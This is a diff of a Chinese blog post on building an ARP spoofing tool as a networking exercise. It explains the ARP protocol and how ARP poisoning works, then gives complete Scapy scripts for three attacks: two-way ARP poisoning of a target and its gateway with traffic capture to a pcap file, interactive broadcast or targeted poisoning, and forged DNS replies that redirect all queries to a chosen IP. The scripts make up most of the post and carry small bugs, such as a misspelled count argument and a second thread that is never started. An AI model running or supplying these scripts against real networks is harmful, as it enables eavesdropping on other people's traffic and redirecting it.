@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -402,28 +402,24 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <p>最近在计网里学习了ARP协议，为了加深理解，所以决定自己写一个ARP的欺骗工具（有的地方也可以翻译成ARP投毒）。</p>
-<p>##ARP协议<br>首先介绍一下ARP协议的定义，先看一下网络的结构模型</p>
+<h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>首先介绍一下ARP协议的定义，先看一下网络的结构模型</p>
 <p><img src="https://github.com/xuanhun/PythonHackingBook1/raw/master/3.5%20ARP%E6%AC%BA%E9%AA%97/img/1.jpg" alt></p>
 <p>ARP协议就是工作在数据链路层的协议，至于ARP到底属于链路层还是网络层是众说纷纭所以不必纠结这个地方。<br>在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p>
 <p>ARP数据包的结构如下</p>
 <p><img src="https://github.com/xuanhun/PythonHackingBook1/raw/master/3.5%20ARP%E6%AC%BA%E9%AA%97/img/3.png" alt></p>
 <p><strong>目标以太网地址</strong>: 目标mac地址<br><strong>源以太网地址</strong>： 发送方mac地址<br><strong>帧类型</strong>：以太类型，ARP为0x0806<br><strong>硬件类型</strong>： 如以太网，分组无线网<br><strong>协议类型</strong>：如IPv4(0x0800),IPv6(0x86DD)<br><strong>硬件地址长度</strong>：每种硬件地址的字节长度，一般为6（以太网）<br><strong>协议地址长度</strong>：每种协议地址的字节长度，一般为4（IPv4）<br><strong>操作码</strong>：1为ARP请求，2为ARP应答，3为RARP请求，4为RARP应答<br><strong>源硬件地址</strong>：一般为发送方MAC地址。<br><strong>源协议地址</strong>：一般为发送方IP地址。<br><strong>目标硬件地址</strong>：一般为目标MAC地址。<br><strong>目标协议地址</strong>：一般为目标IP地址。</p>
 <p>更加详细的ARP协议就不介绍了，不了解的自行百度。</p>
-<p>##ARP欺骗原理<br>ARP工作时，首先请求主机会发送出一个含有所希望到达的IP地址的以太网广播数据包，然后目标IP的所有者会以一个含有IP和MAC地址对的数据包应答请求主机。这样请求主机就能获得要到达的IP地址对应的MAC地址，同时请求主机会将这个地址对放入自己的ARP表缓存起来，以节约不必要的ARP通信。ARP缓存表采用了老化机制，在一段时间内如果表中的某一行没有使用，就会被删除。</p>
+<h2 id="ARP欺骗原理"><a href="#ARP欺骗原理" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h2><p>ARP工作时，首先请求主机会发送出一个含有所希望到达的IP地址的以太网广播数据包，然后目标IP的所有者会以一个含有IP和MAC地址对的数据包应答请求主机。这样请求主机就能获得要到达的IP地址对应的MAC地址，同时请求主机会将这个地址对放入自己的ARP表缓存起来，以节约不必要的ARP通信。ARP缓存表采用了老化机制，在一段时间内如果表中的某一行没有使用，就会被删除。</p>
 <p>局域网上的一台主机，如果接收到一个ARP报文，即使该报文不是该主机所发送的ARP请求的应答报文，该主机也会将ARP报文中的发送者的MAC地址和IP地址更新或加入到ARP表中。</p>
 <p>ARP欺骗攻击就利用了这点，攻击者主动发送ARP报文，发送者的MAC地址为攻击者主机的MAC地址，发送者的IP地址为被攻击主机的IP地址。通过不断发送这些伪造的ARP报文，让局域网上所有的主机和网关ARP表，其对应的MAC地址均为攻击者的MAC地址，这样所有的网络流量都会发送给攻击者主机。由于ARP欺骗攻击导致了主机和网关的ARP表的不正确，这种情况我们也称为ARP中毒。</p>
 <p>根据ARP欺骗者与被欺骗者之间的角色关系的不同，通常可以把ARP欺骗攻击分为如下两种：<br>1.主机型ARP欺骗：欺骗者主机冒充网关设备对其他主机进行欺骗<br>2.网关型ARP欺骗：欺骗者主机冒充其他主机对网关设备进行欺骗</p>
-<p>##Scapy库的介绍<br>本次的代码主要就是基于scapy这个库写的，这个库是一个使用python写的一个网络发包流量监控的库，功能十分强大。</p>
+<h2 id="Scapy库的介绍"><a href="#Scapy库的介绍" class="headerlink" title="Scapy库的介绍"></a>Scapy库的介绍</h2><p>本次的代码主要就是基于scapy这个库写的，这个库是一个使用python写的一个网络发包流量监控的库，功能十分强大。</p>
 <p><img src="https://s2.ax1x.com/2019/05/27/VVUXKs.png" alt></p>
 <p>我们可以看到这个库可以解析上百种协议，这个截图只是很小的一部分。<br>学习这个库我推荐还是阅读官方文档，下载时候的注意事项去官网看基本就可以解决所有的情况。<br>我们本次实验主要是利用这个库的发包以及解析包的能力。</p>
-<p>##代码实现<br>主要功能：</p>
-<p>####1.广播投毒</p>
-<p>####2.定向投毒</p>
-<p>####3.双向欺骗，窃听流量</p>
-<p>####4.还原流量中的文件内容</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]Restoring target..."</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=gateway_mac),count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=target_mac),count=<span class="number">5</span>)</span><br><span class="line">    os.kill(os.getpid(), signal.SIGINT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst = target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst = gateway_mac</span><br><span class="line">    print(<span class="string">"[*]Beginning the ARP poison"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            send(poison_target)</span><br><span class="line">            send(poison_gateway)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[*]ARP posion finished"</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">interface = <span class="string">"en0"</span></span><br><span class="line">target_ip = <span class="string">"192.168.8.125"</span></span><br><span class="line">gateway_ip = <span class="string">"192.168.8.1"</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line">conf.iface = interface</span><br><span class="line">conf.verb = <span class="number">0</span></span><br><span class="line">print(<span class="string">"[*]Setting up %s"</span> % interface)</span><br><span class="line">gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line"><span class="keyword">if</span> gateway_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"[!!]Failed to get gateway mac address"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[*]gateway %s is at %s"</span> % (gateway_ip,gateway_mac))</span><br><span class="line"></span><br><span class="line">target_mac = getmacbyip(target_ip)</span><br><span class="line"><span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"[!!]Failed to get target mac address"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[*]gateway %s is at %s"</span> % (target_ip,target_mac))</span><br><span class="line"></span><br><span class="line">poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))</span><br><span class="line">poison_thread.start()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"[*] Starting sniffer for %d packets......."</span> % packet_count)</span><br><span class="line">    bpf_filter = <span class="string">"ip host %s"</span> % target_ip</span><br><span class="line">    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)</span><br><span class="line">    wrpcap(<span class="string">'arp.pcap'</span>,packets)</span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>主要功能：</p>
+<h4 id="1-广播投毒"><a href="#1-广播投毒" class="headerlink" title="1.广播投毒"></a>1.广播投毒</h4><h4 id="2-定向投毒"><a href="#2-定向投毒" class="headerlink" title="2.定向投毒"></a>2.定向投毒</h4><h4 id="3-双向欺骗，窃听流量"><a href="#3-双向欺骗，窃听流量" class="headerlink" title="3.双向欺骗，窃听流量"></a>3.双向欺骗，窃听流量</h4><h4 id="4-还原流量中的文件内容"><a href="#4-还原流量中的文件内容" class="headerlink" title="4.还原流量中的文件内容"></a>4.还原流量中的文件内容</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]Restoring target..."</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=gateway_mac),count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=target_mac),count=<span class="number">5</span>)</span><br><span class="line">    os.kill(os.getpid(), signal.SIGINT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst = target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst = gateway_mac</span><br><span class="line">    print(<span class="string">"[*]Beginning the ARP poison"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            send(poison_target)</span><br><span class="line">            send(poison_gateway)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[*]ARP posion finished"</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">interface = <span class="string">"en0"</span></span><br><span class="line">target_ip = <span class="string">"192.168.8.125"</span></span><br><span class="line">gateway_ip = <span class="string">"192.168.8.1"</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line">conf.iface = interface</span><br><span class="line">conf.verb = <span class="number">0</span></span><br><span class="line">print(<span class="string">"[*]Setting up %s"</span> % interface)</span><br><span class="line">gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line"><span class="keyword">if</span> gateway_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"[!!]Failed to get gateway mac address"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[*]gateway %s is at %s"</span> % (gateway_ip,gateway_mac))</span><br><span class="line"></span><br><span class="line">target_mac = getmacbyip(target_ip)</span><br><span class="line"><span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"[!!]Failed to get target mac address"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[*]gateway %s is at %s"</span> % (target_ip,target_mac))</span><br><span class="line"></span><br><span class="line">poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))</span><br><span class="line">poison_thread.start()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"[*] Starting sniffer for %d packets......."</span> % packet_count)</span><br><span class="line">    bpf_filter = <span class="string">"ip host %s"</span> % target_ip</span><br><span class="line">    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)</span><br><span class="line">    wrpcap(<span class="string">'arp.pcap'</span>,packets)</span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 <p>版本2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target1</span><span class="params">(gateway_ip,gateway_mac,target_ip,target_mac,conunts)</span>:</span></span><br><span class="line">	send(ARP(op=<span class="number">2</span>,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac),conunt=conunts)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target2</span><span class="params">(gateway_ip,gateway_mac,target_ip,target_mac,conunts)</span>:</span></span><br><span class="line">	send(ARP(op=<span class="number">2</span>,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac),conunt=conunts)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]Restoring target..."</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=gateway_mac),count=<span class="number">10</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=target_mac),count=<span class="number">10</span>)</span><br><span class="line">    os.kill(os.getpid(), signal.SIGINT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	a = input(<span class="string">"是否开启广播欺骗:(y/n)"</span>)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">'y'</span>:</span><br><span class="line">		psrc = input(<span class="string">"输入受害机IP地址"</span>)</span><br><span class="line">		conunts = int(input(<span class="string">"输入发送数据包的数量"</span>))</span><br><span class="line">		send(ARP(op=<span class="number">2</span>,psrc=psrc,hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>),conunt=conunts)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gateway_ip = input(<span class="string">"输入网关IP地址"</span>)</span><br><span class="line">		target_ip = input(<span class="string">"输入受害机IP地址"</span>)</span><br><span class="line">		conunts = int(input(<span class="string">"输入发送数据包的数量"</span>))</span><br><span class="line">		gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">		<span class="keyword">if</span> gateway_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			print(<span class="string">"[!!]Failed to get gateway mac address"</span>)</span><br><span class="line">			sys.exit(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">"[*]gateway %s is at %s"</span> % (gateway_ip,gateway_mac))</span><br><span class="line">		target_mac = getmacbyip(target_ip)</span><br><span class="line">		<span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			print(<span class="string">"[!!]Failed to get target mac address"</span>)</span><br><span class="line">			sys.exit(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">   	 		print(<span class="string">"[*]gateway %s is at %s"</span> % (target_ip,target_mac))</span><br><span class="line">		posion_thread1 = threading.Thread(target=poison_target1, args=(gateway_ip,gateway_mac,target_ip,target_mac,conunts))</span><br><span class="line">		posion_thread1.start()</span><br><span class="line">		posion_thread2 = threading.Thread(target=poison_target2, args=(gateway_ip,gateway_mac,target_ip,target_mac,conunts))</span><br><span class="line">		posion_thread1.start()</span><br><span class="line">		print(<span class="string">"[*]Beginning the ARP poison"</span>)</span><br><span class="line">	b = input(<span class="string">"是否监听网卡:(y/n)"</span>)</span><br><span class="line">	<span class="keyword">if</span> b == <span class="string">'y'</span>:</span><br><span class="line">		interface = input(<span class="string">"输入网卡名"</span>)</span><br><span class="line">		conf.iface = interface</span><br><span class="line">		conf.verb = <span class="number">0</span></span><br><span class="line">		bpf_filter = <span class="string">"ip host %s"</span> % target_ip</span><br><span class="line">		packets = sniff(filter=bpf_filter,iface=interface,conunt=conunts)</span><br><span class="line">		wrpcap(<span class="string">'arp.pcap'</span>,packets)</span><br><span class="line">		restore_target(gateway_ip,gateway_mac,target_ip,target_mac)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		restore_target(gateway_ip,gateway_mac,target_ip,target_mac)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
-
+<h3 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding -*-:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">'main'</span>)</span><br><span class="line">logging.basicConfig(format=<span class="string">'%(levelname)s:%(message)s'</span>,level=logging.DEBUG)</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line"><span class="comment"># Set the interface for scapy to use</span></span><br><span class="line">conf.iface = <span class="string">'br0'</span></span><br><span class="line"><span class="comment"># Set the spoofed response</span></span><br><span class="line">spoofed_ip = <span class="string">'192.168.28.118'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_response</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="comment"># Get the requested domain</span></span><br><span class="line">    req_domain = x[DNS].qd.qname</span><br><span class="line">    logger.info(<span class="string">'Found request for'</span> + req_domain)</span><br><span class="line">    <span class="comment"># First,we delete the existing lengths and checksums..</span></span><br><span class="line">    <span class="comment"># We will let Scapy re-create them</span></span><br><span class="line">    <span class="keyword">del</span>(x[UDP].len)    </span><br><span class="line">    <span class="keyword">del</span>(x[UDP].chksum)</span><br><span class="line">    <span class="keyword">del</span>(x[IP].len)</span><br><span class="line">    <span class="keyword">del</span>(x[IP].chksum)</span><br><span class="line">    <span class="comment"># Let`s build our response from a copy of the original packet</span></span><br><span class="line">    response = x.copy()</span><br><span class="line">    <span class="comment"># we need to start by changing our response to be "from-ds" ,or from the access point.</span></span><br><span class="line">    response.FCfield = <span class="number">2L</span></span><br><span class="line">    <span class="comment"># Switch the MAC addresses</span></span><br><span class="line">    <span class="comment">#response.addr1,response.addr2 = x.addr2,x.addr1</span></span><br><span class="line">    response.src,response.dst = x.dst,x.src</span><br><span class="line">    <span class="comment"># Switch the IP addresses</span></span><br><span class="line">    response[IP].src,response[IP].dst = x[IP].dst,x[IP].src</span><br><span class="line">    <span class="comment"># Switch the ports</span></span><br><span class="line">    response.sport,response.dport = x.dport,x.sport</span><br><span class="line">    <span class="comment"># Set the DNS flags</span></span><br><span class="line">    response[DNS].qr = <span class="number">1L</span></span><br><span class="line">    response[DNS].ra = <span class="number">1L</span></span><br><span class="line">    response[DNS].ancount = <span class="number">1</span></span><br><span class="line">    <span class="comment"># Let`s add on the answer section</span></span><br><span class="line">    response[DNS].an = DNSRR(</span><br><span class="line">        rrname = req_domain,</span><br><span class="line">        type = <span class="string">'A'</span>,</span><br><span class="line">        rclass = <span class="string">'IN'</span>,</span><br><span class="line">        ttl = <span class="number">900</span>,</span><br><span class="line">        rdata = spoofed_ip</span><br><span class="line">        )</span><br><span class="line">    <span class="comment"># Now,we inject the response!</span></span><br><span class="line">    sendp(response)</span><br><span class="line">    logger.info(<span class="string">'Sent response:'</span> + req_domain + <span class="string">' -&gt; '</span> + spoofed_ip + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    logger.info(<span class="string">'Starting to intercept [CTRL+C to stop]'</span>)</span><br><span class="line">    sniff(prn=<span class="keyword">lambda</span> x: send_response(x),lfilter=<span class="keyword">lambda</span> x:x.haslayer(UDP) <span class="keyword">and</span> x.dport == <span class="number">53</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Make it happen!</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
@@ -431,7 +427,7 @@ height:50vh;
             <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
             </p><p>原文链接：<a href="http://yoursite.com/2019/05/27/自己动手写工具(3)--ARP欺骗/">http://yoursite.com/2019/05/27/自己动手写工具(3)--ARP欺骗/</a>
             </p><p>发表日期：<a href="http://yoursite.com/2019/05/27/自己动手写工具(3)--ARP欺骗/">May 27th 2019, 12:31:11 am</a>
